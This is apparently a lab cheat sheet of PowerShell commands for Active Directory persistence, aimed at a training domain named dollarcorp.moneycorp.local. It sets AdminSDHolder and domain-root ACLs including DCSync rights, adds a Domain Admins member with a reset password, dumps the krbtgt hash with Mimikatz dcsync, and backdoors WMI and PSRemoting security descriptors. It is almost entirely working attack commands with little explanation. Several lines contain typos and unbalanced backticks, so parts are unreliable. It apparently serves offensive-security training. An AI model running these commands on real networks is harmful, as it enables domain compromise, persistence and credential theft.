# NOT FULL
###### ACLs - AdminSDHolder
##### Local
`. .\Invoke-SDPropagator.ps1`
`Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`
_FOR pre-Server 2008 machine:_
`Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose`
##### Remote
### - PowerView
`Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 R-ights All -Verbose`
### - ActiveDirectory module
`Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dolarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose`

`$sess = New-PSSession -ComputerName dcorp-dc.dolarcorp.moneycorp.local`
`Invoke-Command -Filepath .\Invoke-SDPropagator.ps1 $Session $sess`
`Enter-PSSession -Session $sess`
### - PowerView
`Invoke-SDPropagator -showProcess -timeoutMinutes 1`
`Get-ObjectAcl -SamAccount "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student1'}``
### - Ad module
`(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access |  ?{$_.IdentityReference -match 'student1'}``
### - PowerView
`Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
### - AD
`AddADGroupMember -Identity 'Domain Admins' -Members testda`
### - PW
`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Verbose`
### - AD
`SetADAccountPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Verbose`
### - PowerView
`Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights All -Verbose`
### - ActiveDirectory module
`Set-ADACL -DistinguishedName 'DC=dolarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose`
### - PowerView
`Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose
### - ActiveDirectory module
`Set-ADACL -DistinguishedName 'DC=dolarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose`
## Using
`Enter-PSSession -computer dcorp-dc
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

# ACLs - Security Descriptors
#### On local
`Set-remoteWMI -UserName student1 -Verbose`

## Get 
`Get-WmiObject -class win32_operatingsystem -Computername dcorp-dc.dollar.money.local`
#### On remote
`Set-remoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose`
#### On remote
`Set-remoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose`
#### On remote
`Set-remoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose`

`Set-RemotePSRemoting -UserName studentadmin -ComputerName dcorp-dc.dollar.money.local -Verbose`
`Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollar.money.local`
